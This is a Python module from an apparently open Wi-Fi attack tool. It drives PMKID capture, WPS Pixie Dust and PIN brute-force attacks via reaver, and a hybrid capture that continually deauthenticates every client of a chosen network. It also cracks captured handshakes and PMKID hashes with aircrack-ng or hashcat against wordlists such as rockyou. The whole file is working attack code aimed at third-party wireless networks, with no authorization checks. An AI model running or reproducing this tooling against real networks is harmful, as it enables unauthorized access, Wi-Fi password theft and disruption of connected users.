"""Attack flow helpers extracted from the main controller."""

from __future__ import annotations

import concurrent.futures
from datetime import datetime
import os
from pathlib import Path
import re
import shutil
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from rich import box
from rich.live import Live
from rich.prompt import Prompt
from rich.table import Table

from app.ui import BORDER_STYLE
from app.safety import sanitize_filename
from attacks.commands import (
    aircrack_check,
    aircrack_crack,
    airodump_capture,
    aireplay_deauth,
    hashcat_crack,
    hcxdumptool_capture,
    hcxpcapngtool_convert,
)
from attacks.parsers import (
    extract_wifi_password,
    has_aircrack_handshake,
    is_valid_wifi_password,
    parse_aircrack_network_info,
)
from config import DEFAULT_WORDLIST, HANDSHAKE_DIR, ROCKYOU_WORDLIST


def run_pmkid_attack(app) -> None:
    """Run PMKID capture flow."""
    if not app.selected_network:
        app.console.print("[bold red]Please select a target network first![/]")
        return

    network = app.networks[app.selected_network]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    handshake_dir = HANDSHAKE_DIR
    if not handshake_dir.exists():
        app.console.print("[bold yellow]Creating handshake directory...[/]")
        handshake_dir.mkdir(exist_ok=True)

    safe_ssid = sanitize_filename(network.get("ssid"), fallback="network")
    output_file = handshake_dir / f"pmkid_{safe_ssid}_{timestamp}"
    output_pcapng = output_file.with_suffix(".pcapng")
    output_hash = output_file.with_suffix(".22000")
    pmkid_found = False
    start_time = time.time()

    def create_status_table():
        current_time = time.time()
        elapsed = int(current_time - start_time)
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
        table.add_column("BSSID", style="cyan")
        table.add_column("Channel", style="green")
        table.add_column("ESSID", style="yellow")
        table.add_column("Clients", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Time Elapsed", style="yellow")

        status = "[bold green]PMKID Found! (Continuing...)" if pmkid_found else "[info]Capturing..."
        table.add_row(
            app.selected_network,
            str(network["channel"]),
            network["ssid"],
            str(len(network["clients"])),
            status,
            elapsed_str,
        )
        return table

    try:
        with Live(refresh_per_second=4) as live:
            process = subprocess.Popen(
                hcxdumptool_capture(app.interface_name, output_pcapng),
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
            )

            while True:
                live.update(create_status_table())
                if output_pcapng.exists():
                    subprocess.run(
                        hcxpcapngtool_convert(output_hash, output_pcapng),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    if output_hash.exists() and output_hash.stat().st_size > 0 and not pmkid_found:
                        pmkid_found = True
                        app.logger.info(
                            f"PMKID captured successfully (continuing). Saved to: {output_hash}",
                        )
                time.sleep(0.25)

    except KeyboardInterrupt:
        app.console.print("\n[bold yellow]PMKID attack stopped by user.[/]")
    finally:
        if "process" in locals():
            try:
                process.terminate()
                process.wait(timeout=2)
            except Exception:
                process.kill()

        if pmkid_found:
            app.console.print(f"\n[bold green]PMKID attack completed successfully. File saved to: {output_hash}[/]")
        else:
            app.console.print("\n[bold yellow]PMKID attack completed without capturing PMKID.[/]")

        app.logger.info(f"PMKID attack completed: {'Successful' if pmkid_found else 'Failed'}")
        app.current_menu = "attack"


def run_wps_attack(app) -> None:
    """Run WPS Pixie Dust or PIN brute-force flow."""
    if not app.selected_network:
        app.console.print("[bold red]Please select a target network first![/]")
        return

    network = app.networks[app.selected_network]
    if not network["wps"]:
        app.console.print("[bold red]Selected network does not have WPS enabled![/]")
        return

    app.console.print("\n[bold yellow]WPS Attack:[/]")
    app.console.print("1. Pixie Dust attack")
    app.console.print("2. PIN brute force")
    app.console.print("0. Back")

    choice = Prompt.ask("Select an option")
    if choice == "0":
        return

    try:
        if choice == "1":
            app.console.print("[bold blue]Starting Pixie Dust attack...[/]")
            cmd = f"reaver -i {app.interface_name} -b {app.selected_network} -c {network['channel']} -K 1 -vv"
        else:
            app.console.print("[bold blue]Starting PIN brute force...[/]")
            cmd = f"reaver -i {app.interface_name} -b {app.selected_network} -c {network['channel']} -vv"

        process = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
        )

        with Live(refresh_per_second=4) as live:
            while True:
                output = process.stdout.readline()
                if output == "" and process.poll() is not None:
                    break
                if output:
                    table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
                    table.add_column("Network", style="cyan")
                    table.add_column("Status", style="yellow")
                    table.add_row(network["ssid"], output.strip())
                    live.update(table)

                    if "WPS PIN:" in output:
                        pin = output.split("WPS PIN:")[1].strip()
                        app.console.print(f"\n[success]WPS PIN found: {pin}[/]")
                        break
                    if "WPA PSK:" in output:
                        password = output.split("WPA PSK:")[1].strip()
                        app.console.print(f"\n[success]WPA password found: {password}[/]")
                        break

    except KeyboardInterrupt:
        app.console.print("\n[bold yellow]WPS attack stopped by user.[/]")
    finally:
        if "process" in locals():
            try:
                process.terminate()
                process.wait(timeout=2)
            except Exception:
                process.kill()
        app.current_menu = "attack"


def run_hybrid_attack(app) -> None:
    """Run hybrid attack flow using both handshake and PMKID capture."""
    if not app.selected_network:
        app.console.print("[bold red]Please select a target network first![/]")
        return

    network = app.networks[app.selected_network]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ssid = sanitize_filename(network.get("ssid"), fallback="network")

    handshake_dir = HANDSHAKE_DIR
    handshake_dir.mkdir(exist_ok=True)

    handshake_file = handshake_dir / f"handshake_{safe_ssid}_{timestamp}"
    pmkid_file = handshake_dir / f"pmkid_{safe_ssid}_{timestamp}"
    pmkid_pcapng = pmkid_file.with_suffix(".pcapng")
    pmkid_hash = pmkid_file.with_suffix(".22000")

    handshake_found = False
    pmkid_found = False
    dump_proc = None
    pmkid_proc = None
    start_time = time.time()
    final_handshake = None

    known_clients = set(network["clients"])
    last_client_check = time.time()
    client_check_interval = 5
    client_lock = threading.Lock()

    is_wpa3 = False
    if "cipher" in network and "WPA3" in network["cipher"]:
        is_wpa3 = True
    security_type = "WPA3" if is_wpa3 else "WPA/WPA2"

    def create_status_table():
        current_time = time.time()
        elapsed = int(current_time - start_time)
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
        table.add_column("BSSID", style="cyan")
        table.add_column("Channel", style="green")
        table.add_column("ESSID", style="yellow")
        table.add_column("Clients", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Time Elapsed", style="yellow")

        with client_lock:
            status = "[success]Handshake found (continuing)." if handshake_found else "[info]Capturing..."
            table.add_row(
                app.selected_network,
                str(network["channel"]),
                network["ssid"],
                str(len(known_clients)),
                status,
                elapsed_str,
            )
        return table

    def check_for_new_clients():
        nonlocal last_client_check
        current_time = time.time()
        if current_time - last_client_check < client_check_interval:
            return
        last_client_check = current_time
        with app._networks_lock:
            if app.selected_network in app.networks:
                current_clients = set(app.networks[app.selected_network]["clients"])
                with client_lock:
                    new_clients = current_clients - known_clients
                    if new_clients:
                        known_clients.update(new_clients)

    def deauth_all_clients():
        with client_lock:
            clients_to_deauth = list(known_clients)
        if clients_to_deauth:
            subprocess.run(
                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=30,
            )
            for client in clients_to_deauth:
                subprocess.run(
                    aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2, client=client),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )

    def check_for_handshake():
        nonlocal handshake_found, pmkid_found, final_handshake
        if not handshake_found:
            cap_files = list(handshake_dir.glob(f"handshake_{safe_ssid}_{timestamp}*.cap"))
            if cap_files:
                result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
                if has_aircrack_handshake(result.stdout):
                    handshake_found = True
                    final_handshake = handshake_dir / f"handshake_{safe_ssid}_{timestamp}.cap"
                    shutil.move(str(cap_files[0]), str(final_handshake))
                    app.logger.info(
                        f"Hybrid: {security_type} handshake saved to {final_handshake} "
                        "(continuing until Ctrl+C)",
                    )

        if not pmkid_found and pmkid_pcapng.exists():
            subprocess.run(hcxpcapngtool_convert(pmkid_hash, pmkid_pcapng), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if pmkid_hash.exists() and pmkid_hash.stat().st_size > 0:
                pmkid_found = True
                app.logger.info(
                    f"Hybrid: PMKID saved to {pmkid_hash} (continuing until Ctrl+C)",
                )

    try:
        with Live(refresh_per_second=4) as live:
            dump_proc = subprocess.Popen(
                airodump_capture(
                    app.interface_name,
                    channel=network["channel"],
                    bssid=app.selected_network,
                    output_prefix=handshake_file,
                ),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pmkid_proc = subprocess.Popen(
                hcxdumptool_capture(app.interface_name, pmkid_pcapng, network["channel"]),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            while True:
                live.update(create_status_table())
                check_for_new_clients()
                deauth_all_clients()
                check_for_handshake()
                time.sleep(0.25)

    except KeyboardInterrupt:
        if handshake_found or pmkid_found:
            app.console.print("\n[bold green]Attack stopped by user. Captures were successful![/]")
        else:
            app.console.print("\n[bold yellow]Attack stopped by user. No captures were made.[/]")
    finally:
        if dump_proc:
            try:
                dump_proc.terminate()
                dump_proc.wait(timeout=2)
            except Exception:
                dump_proc.kill()
        if pmkid_proc:
            try:
                pmkid_proc.terminate()
                pmkid_proc.wait(timeout=2)
            except Exception:
                pmkid_proc.kill()

        for ext in [".csv", ".netxml", "-01.cap"]:
            for f in handshake_dir.glob(f"handshake_{safe_ssid}_{timestamp}*{ext}"):
                try:
                    f.unlink()
                except Exception:
                    pass

        results_table = Table(
            show_header=True,
            header_style="bold magenta",
            box=box.MINIMAL,
            border_style=BORDER_STYLE,
            title="[bold blue]Attack Results[/]",
        )
        results_table.add_column("Method", style="cyan")
        results_table.add_column("Status", style="yellow")
        results_table.add_column("File", style="green")

        if handshake_found:
            results_table.add_row("Handshake", "[success]Captured.[/]", str(final_handshake))
        else:
            results_table.add_row("Handshake", "[error]Failed.[/]", "")

        if pmkid_found:
            results_table.add_row("PMKID", "[success]Captured.[/]", str(pmkid_hash))
        else:
            results_table.add_row("PMKID", "[error]Failed.[/]", "")

        app.console.print("\n", results_table)

        if handshake_found or pmkid_found:
            app.console.print("\n[success]Hybrid attack completed successfully.[/]")
            app.console.print("[yellow]Use Dictionary Attack to crack the captured files.[/]")
        else:
            app.console.print("\n[error]Hybrid attack failed. No hashes captured.[/]")

        app.logger.info(f"Hybrid attack completed - Handshake: {handshake_found}, PMKID: {pmkid_found}")
        app.current_menu = "attack"


def run_capture_handshake(app) -> None:
    """Capture WPA/WPA2/WPA3 handshake with the advanced capture engine."""
    from app.services.attacks.handshake_engine import run_handshake_capture_engine

    run_handshake_capture_engine(app)


def run_dictionary_attack(app) -> None:
    """Run dictionary attack for handshake or PMKID files."""
    if not app.selected_network and not HANDSHAKE_DIR.exists():
        app.console.print("[bold red]Please select a target network first![/]")
        return

    network = app.networks[app.selected_network] if app.selected_network else None
    is_wpa3 = False
    if network and "security" in network:
        if isinstance(network["security"], str) and "WPA3" in network["security"]:
            is_wpa3 = True
        elif isinstance(network["security"], list) and any("WPA3" in sec for sec in network["security"]):
            is_wpa3 = True

    app.console.print("\n[bold yellow]Dictionary Attack:[/]")
    app.console.print("1. Use handshake file")
    app.console.print("2. Use PMKID file")
    if is_wpa3:
        app.console.print("3. Use WPA3 SAE hash")
    app.console.print("0. Back")

    choice = Prompt.ask("Select an option")
    if choice == "0":
        return
    if choice == "1":
        handshake_dir = HANDSHAKE_DIR
        if not handshake_dir.exists():
            app.console.print("[bold yellow]Creating handshake directory...[/]")
            handshake_dir.mkdir(exist_ok=True)
            app.console.print("[bold red]No handshake files found! Capture a handshake first.[/]")
            return

        handshake_files = list(handshake_dir.glob("*.cap"))
        if not handshake_files:
            app.console.print("[bold red]No handshake files found in 'handshake' directory![/]")
            return

        app.console.print("\n[bold green]Available Handshake Files:[/]")
        for idx, file in enumerate(handshake_files, 1):
            result = subprocess.run(aircrack_check(file), capture_output=True, text=True)
            status = "[green]Valid" if has_aircrack_handshake(result.stdout) else "[red]Invalid"
            app.console.print(f"{idx}. {file.name} - {status}")

        file_choice = Prompt.ask(
            "\nSelect handshake file (0 to cancel)",
            choices=["0"] + [str(i) for i in range(1, len(handshake_files) + 1)],
        )
        if file_choice == "0":
            return

        selected_file = handshake_files[int(file_choice) - 1]
        result = subprocess.run(aircrack_check(selected_file), capture_output=True, text=True)
        if not has_aircrack_handshake(result.stdout):
            app.console.print("[bold red]Selected file does not contain a valid handshake![/]")
            return
    elif choice == "2":
        handshake_dir = HANDSHAKE_DIR
        if not handshake_dir.exists():
            app.console.print("[bold yellow]Creating handshake directory...[/]")
            handshake_dir.mkdir(exist_ok=True)

        app.console.print("\n[bold yellow]PMKID File Options:[/]")
        app.console.print("1. Select from captured PMKID files")
        app.console.print("2. Specify custom PMKID file path")
        app.console.print("0. Cancel")

        pmkid_option = Prompt.ask("Choose PMKID option", choices=["0", "1", "2"])
        if pmkid_option == "0":
            return
        if pmkid_option == "1":
            pmkid_files = list(handshake_dir.glob("*.22000")) + list(handshake_dir.glob("pmkid_*.pcapng"))
            if not pmkid_files:
                app.console.print("[bold red]No PMKID files found in 'handshake' directory![/]")
                return
            app.console.print("\n[bold green]Available PMKID Files:[/]")
            for idx, file in enumerate(pmkid_files, 1):
                app.console.print(f"{idx}. {file.name}")
            file_choice = Prompt.ask(
                "\nSelect PMKID file (0 to cancel)",
                choices=["0"] + [str(i) for i in range(1, len(pmkid_files) + 1)],
            )
            if file_choice == "0":
                return
            selected_file = pmkid_files[int(file_choice) - 1]
            if selected_file.suffix == ".pcapng":
                output_file = selected_file.with_suffix(".22000")
                app.console.print("[bold blue]Converting PCAPNG to hashcat format...[/]")
                subprocess.run(hcxpcapngtool_convert(output_file, selected_file), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
                    app.console.print("[bold red]Failed to convert PMKID file to hashcat format![/]")
                    return
                selected_file = output_file
        else:
            file_path = Prompt.ask("Enter path to PMKID file (absolute or relative path)")
            selected_file = Path(file_path)
            if not selected_file.exists():
                app.console.print(f"[bold red]File not found: {selected_file}[/]")
                return
            if selected_file.suffix.lower() == ".pcapng":
                output_file = selected_file.with_suffix(".22000")
                app.console.print("[bold blue]Converting PCAPNG to hashcat format...[/]")
                subprocess.run(hcxpcapngtool_convert(output_file, selected_file), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
                    app.console.print("[bold red]Failed to convert PMKID file to hashcat format![/]")
                    return
                selected_file = output_file
    else:
        app.console.print("[bold red]Invalid choice.[/]")
        return

    app.console.print("\n[bold yellow]Select Wordlist:[/]")
    app.console.print(f"1. Use default wordlist ({DEFAULT_WORDLIST})")
    app.console.print(f"2. Use rockyou wordlist ({ROCKYOU_WORDLIST})")
    app.console.print("3. Specify custom wordlist path")
    app.console.print("0. Cancel")
    wordlist_choice = Prompt.ask("Choose wordlist option (0 to cancel)", choices=["0", "1", "2", "3"])

    if wordlist_choice == "0":
        return

    if wordlist_choice == "1":
        wordlist = str(DEFAULT_WORDLIST)
        if not os.path.exists(wordlist):
            app.console.print(f"[bold red]Default wordlist not found: {wordlist}[/]")
            return
    elif wordlist_choice == "2":
        wordlist = str(ROCKYOU_WORDLIST)
        if not os.path.exists(wordlist):
            app.console.print(f"[bold red]Rockyou wordlist not found: {wordlist}[/]")
            return
    else:
        wordlist = Prompt.ask("Enter path to wordlist")
        if not os.path.exists(wordlist):
            app.console.print(f"[bold red]Wordlist not found: {wordlist}[/]")
            return

    app.console.print(f"\n[bold green]Starting dictionary attack against: {selected_file.name}[/]")
    app.console.print(f"[bold blue]Using wordlist: {wordlist}[/]")
    app.console.print("[bold yellow]This process may take some time. Press Ctrl+C to stop.[/]")
    start_time = time.time()
    password_found = False
    last_progress = 0
    last_speed = "0 k/s"
    last_tested_keys = 0
    current_key = ""
    process = None

    def create_status_display():
        progress_percent = last_progress / 100
        filled_length = int(50 * progress_percent)
        empty_length = 50 - filled_length
        if progress_percent < 0.3:
            color = "bright_red"
        elif progress_percent < 0.6:
            color = "bright_yellow"
        elif progress_percent < 0.9:
            color = "bright_green"
        else:
            color = "bright_blue"
        return f"[{color}]{'=' * filled_length}[/][dim]{'-' * empty_length}[/] [bold {color}]{last_progress:.2f}%[/]"

    bssid = None
    essid = None
    is_wpa3 = False
    try:
        aircrack_result = subprocess.run(aircrack_check(selected_file), capture_output=True, text=True)
        network_info = parse_aircrack_network_info(aircrack_result.stdout)
        if network_info:
            bssid = network_info.bssid
            essid = network_info.essid
            is_wpa3 = network_info.is_wpa3
            if is_wpa3:
                app.console.print("[bold blue]WPA3 network detected[/]")
            app.logger.info(f"Extracted from handshake - BSSID: {bssid}, ESSID: {essid}, WPA3: {is_wpa3}")
    except Exception as exc:
        app.logger.error(f"Error extracting network info: {str(exc)}")

    uses_hashcat = False
    if choice == "2":
        uses_hashcat = True
        cmd = hashcat_crack(selected_file, wordlist, mode=16800, workload=3, force=True)
        app.console.print("[bold blue]Using hashcat for PMKID cracking (mode 16800)[/]")
    else:
        # Avoid forcing ESSID: malformed/ambiguous ESSID parsing can block valid cracks.
        # This mirrors the known working manual command:
        # aircrack-ng <capture.cap> -w <wordlist>
        cmd = aircrack_crack(selected_file, wordlist, None)
        app.console.print("[bold blue]Using aircrack-ng for dictionary attack[/]")

    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        all_output = []
        with Live(create_status_display(), refresh_per_second=4) as live:
            for line in iter(process.stdout.readline, ""):
                line = line.strip()
                if line:
                    all_output.append(line)
                    app.logger.debug(f"Aircrack output: {line}")
                try:
                    progress_match = re.search(r"(\d+\.\d+)%", line)
                    if progress_match:
                        last_progress = float(progress_match.group(1))
                    if is_wpa3 and "Progress.....: " in line:
                        progress_parts = line.split("Progress.....: ")[1].split("%")[0].strip()
                        try:
                            last_progress = float(progress_parts)
                        except Exception:
                            pass
                    keys_match = re.search(r"(\d+)/(\d+) keys tested", line)
                    if keys_match:
                        last_tested_keys = int(keys_match.group(1))
                    if is_wpa3 and "Speed.#1" in line:
                        speed_parts = line.split("Speed.#1.....: ")[1].strip()
                        last_speed = speed_parts
                    else:
                        speed_match = re.search(r"(\d+[\.,]\d+ [kMG]?/s)", line)
                        if speed_match:
                            last_speed = speed_match.group(1)

                    found_in_line = False
                    password_candidate = extract_wifi_password(line, include_hashcat=uses_hashcat)
                    if password_candidate:
                        current_key = password_candidate
                        password_found = True
                        app.logger.info(
                            f"Password found for {network['ssid'] if network else selected_file.name}: {current_key}"
                        )
                        process.terminate()
                        found_in_line = True
                    if found_in_line:
                        break
                    if len(line) > 0:
                        live.update(create_status_display())
                    if any(x in line.lower() for x in ["reading", "loaded"]) and last_progress < 0.1:
                        last_progress = 0.05
                except Exception as exc:
                    app.logger.error(f"Error parsing aircrack output: {str(exc)}")

        # Drain any remaining buffered output after the read loop ends.
        if process and process.stdout:
            remaining_output = process.stdout.read()
            if remaining_output:
                all_output.append(remaining_output)
        last_progress = 100.0

        if not password_found:
            full_output = "\n".join(all_output)
            password_candidate = extract_wifi_password(full_output, include_hashcat=uses_hashcat)
            if password_candidate:
                current_key = password_candidate
                password_found = True
                app.logger.info(f"Password found in output analysis: {current_key}")

        if password_found and not is_valid_wifi_password(current_key):
            app.logger.warning(f"Invalid password candidate detected: {current_key} - marking as not found")
            password_found = False
            current_key = ""

        elapsed_time = time.time() - start_time
        hours = int(elapsed_time // 3600)
        minutes = int((elapsed_time % 3600) // 60)
        seconds = int(elapsed_time % 60)
        elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

        result_table = Table(
            show_header=True,
            header_style="bold magenta",
            box=box.MINIMAL,
            border_style=BORDER_STYLE,
            title="[bold blue]Dictionary Attack Results[/]",
        )
        result_table.add_column("Target", style="cyan")
        result_table.add_column("Status", style="green")
        result_table.add_column("Tested Keys", style="yellow")
        result_table.add_column("Speed", style="magenta")
        result_table.add_column("Time", style="blue")
        result_table.add_column("Password", style="red")

        if password_found and current_key and len(current_key) >= 8 and len(current_key) <= 63:
            status = "[success]CRACKED[/]"
            password_display = f"[bold red]{current_key}[/]"
        else:
            status = "[error]FAILED[/]"
            password_display = "[dim]Not Found[/dim]"
            password_found = False
            current_key = ""

        result_table.add_row(
            str(selected_file.name),
            status,
            str(last_tested_keys),
            last_speed,
            elapsed_str,
            password_display,
        )
        app.console.print("\n")
        app.console.print(result_table)
        if not password_found:
            app.logger.warning(f"Failed to crack password for {selected_file}")
    except KeyboardInterrupt:
        app.console.print("\n[bold yellow]Dictionary attack interrupted by user[/]")
        app.logger.info("Dictionary attack interrupted by user")
    except Exception as exc:
        app.console.print(f"\n[bold red]Error during dictionary attack: {str(exc)}[/]")
        app.logger.error(f"Error during dictionary attack: {str(exc)}")
    finally:
        if process:
            try:
                process.terminate()
                try:
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    process.kill()
                    try:
                        process.wait(timeout=2)
                    except Exception:
                        pass
            except Exception:
                pass
        try:
            if uses_hashcat:
                subprocess.run(["pkill", "-9", "-f", "hashcat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(["pkill", "-9", "-f", "aircrack-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
